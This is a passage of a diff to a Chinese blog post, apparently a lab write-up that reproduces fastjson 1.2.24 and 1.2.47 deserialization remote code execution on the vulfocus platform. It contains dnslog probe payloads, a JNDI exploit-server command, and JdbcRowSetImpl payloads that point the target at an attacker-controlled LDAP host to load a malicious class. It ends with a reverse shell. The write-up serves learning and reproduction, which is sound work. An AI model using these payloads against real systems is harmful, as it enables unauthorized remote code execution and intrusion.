 <li>一定要注意，假如用的是VPS的话，一定要在防火墙中配置开放端口，否则请求不到数据，如果采用的个人PC，那么一样的，端口一定要设置为通行，否则服务没有办法被请求到</li>
 </ul>
 <h3 id="一键脚本搭建"><a href="#一键脚本搭建" class="headerlink" title="一键脚本搭建"></a>一键脚本搭建</h3><ul>
 <li>直接github仓库，QAQ这个写的真的好用，我git到本地修改了一下端口，编译过之后直接起服务</li>
 <li><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md">https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md</a></li>
 <li>利用代码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [<span class="built_in">command</span>] [-A] [address]</span><br></pre></td></tr></table></figure></li>
-<li>我这里编译之后拷贝出来了对应的jar包<br><img src="/.com//2020-07-14-21-36-07.png"></li>
-<li>执行命令之后起服务看的很舒服，直接起了3个版本两种不同的服务，总计7个<br><img src="/.com//2020-07-14-21-37-53.png"></li>
+<li>我这里编译之后拷贝出来了对应的jar包<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-36-07.png"></li>
+<li>执行命令之后起服务看的很舒服，直接起了3个版本两种不同的服务，总计7个<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-37-53.png"></li>
 <li>我们通常使用jdk-1.8的版本来执行，而且ldap能处理的版本更广，所以我选择的是jdk-1.8下面的ldap服务</li>
 </ul>
 <h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><ul>
-<li>直接构造请求<br><img src="/.com//2020-07-13-16-36-50.png"></li>
+<li>直接构造请求<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-16-36-50.png"></li>
 <li>看到报错中是存在fastjson的字样，我们利用<a target="_blank" rel="noopener" href="http://dnslog.cn/">dnslog</a>来检查能否请求到服务</li>
 <li>这里不仅检查能否利用，同时判断服务主机能否访问某些外网设备，相当于简单的检查网络连通性</li>
-<li>首先捕获GET请求包，修改请求类型为POST，然后修改type为json，最后添加我们的payload作为数据，这里我还是使用的桥接，所以靶机的ip改变了，等下我攻击和回连也采用的VPS，<del>因为本机的防火墙解决不来</del><br><img src="/.com//2020-07-14-21-45-18.png"></li>
-<li>可以在我们的dnslog上看到我们的访问记录，记得刷新<br><img src="/.com//2020-07-14-21-46-19.png"></li>
+<li>首先捕获GET请求包，修改请求类型为POST，然后修改type为json，最后添加我们的payload作为数据，这里我还是使用的桥接，所以靶机的ip改变了，等下我攻击和回连也采用的VPS，<del>因为本机的防火墙解决不来</del><br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-45-18.png"></li>
+<li>可以在我们的dnslog上看到我们的访问记录，记得刷新<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-46-19.png"></li>
 <li>dnslog探测的payload有如下几种<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 常规检测</span></span><br><span class="line">&#123;<span class="attr">&quot;zeo&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br><span class="line"><span class="comment">// 特殊构造</span></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet6Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="attr">&quot;address&quot;</span>:,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
-<li>首先，VPS上已经开启了服务，将恶意的class挂载到某个端口<br><img src="/.com//2020-07-14-21-54-27.png"></li>
-<li>其次，回连的监听已经配置好了<br><img src="/.com//2020-07-14-21-55-17.png"></li>
+<li>首先，VPS上已经开启了服务，将恶意的class挂载到某个端口<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-54-27.png"></li>
+<li>其次，回连的监听已经配置好了<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-55-17.png"></li>
 <li>直接构造payload请求过去<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;a&quot;</span>:&#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;b&quot;</span>:&#123;</span><br><span class="line">      <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://&lt;YOU-VPS-IP&gt;:&lt;Port&gt;/&lt;Class&gt;&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>注意这里针对的是1.2.47版本及其以下，所采用的payload<br><img src="/.com//2020-07-14-21-59-09.png"></li>
-<li>可以看到我们的服务已经被请求过了，返回了构造的恶意class<br><img src="/.com//2020-07-14-22-00-00.png"></li>
+<li>注意这里针对的是1.2.47版本及其以下，所采用的payload<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-21-59-09.png"></li>
+<li>可以看到我们的服务已经被请求过了，返回了构造的恶意class<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-00-00.png"></li>
 <li>但是我们的VPS并没有获取到对应的反弹shell</li>
-<li>原因是我们的payload在目标机器上没有完美的执行，采用<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64</a>自解码payload完成攻击<br><img src="/.com//2020-07-14-22-02-21.png"></li>
-<li>攻击结果<br><img src="/.com//2020-07-14-22-05-05.png"></li>
-<li>但是这是1.2.47的攻击成果…接下来我们利用以下1.2.24版本的fastjson<br><img src="/.com//2020-07-14-22-12-57.png"></li>
-<li>payload<br><img src="/.com//2020-07-14-22-26-51.png"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;a&quot;</span>:&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://&lt;YOU-VPS-IP&gt;:&lt;Port&gt;/&lt;Class&gt;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
-<li>Get Shell<br><img src="/.com//2020-07-14-22-28-35.png"></li>
+<li>原因是我们的payload在目标机器上没有完美的执行，采用<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64</a>自解码payload完成攻击<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-02-21.png"></li>
+<li>攻击结果<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-05-05.png"></li>
+<li>但是这是1.2.47的攻击成果…接下来我们利用以下1.2.24版本的fastjson<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-12-57.png"></li>
+<li>payload<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-26-51.png"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;a&quot;</span>:&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://&lt;YOU-VPS-IP&gt;:&lt;Port&gt;/&lt;Class&gt;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
+<li>Get Shell<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-28-35.png"></li>
 </ul>
 <h1 id="vulfocus验证成果"><a href="#vulfocus验证成果" class="headerlink" title="vulfocus验证成果"></a>vulfocus验证成果</h1><h2 id="不得不说"><a href="#不得不说" class="headerlink" title="不得不说"></a>不得不说</h2><ul>
-<li>真的坑，实际上他环境中的1.2.48和1.2.24交换了，但是名称没有修改，所以用1.2.48的payload打1.2.24<br><img src="/.com//2020-07-14-22-07-42.png"></li>
+<li>真的坑，实际上他环境中的1.2.48和1.2.24交换了，但是名称没有修改，所以用1.2.48的payload打1.2.24<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-22-07-42.png"></li>
 </ul>
 <h2 id="flag提交"><a href="#flag提交" class="headerlink" title="flag提交"></a>flag提交</h2><ul>
-<li>首先是1.2.47的漏洞，getshell没有问题<br><img src="/.com//2020-07-13-23-26-17.png"></li>
-<li>然后第二天成功复现1.2.24版本的漏洞<br><img src="/.com//2020-07-14-14-39-24.png"></li>
+<li>首先是1.2.47的漏洞，getshell没有问题<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-13-23-26-17.png"></li>
+<li>然后第二天成功复现1.2.24版本的漏洞<br><img src="2020-07-13-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2020-07-14-14-39-24.png"></li>
 </ul>
 
     </div>
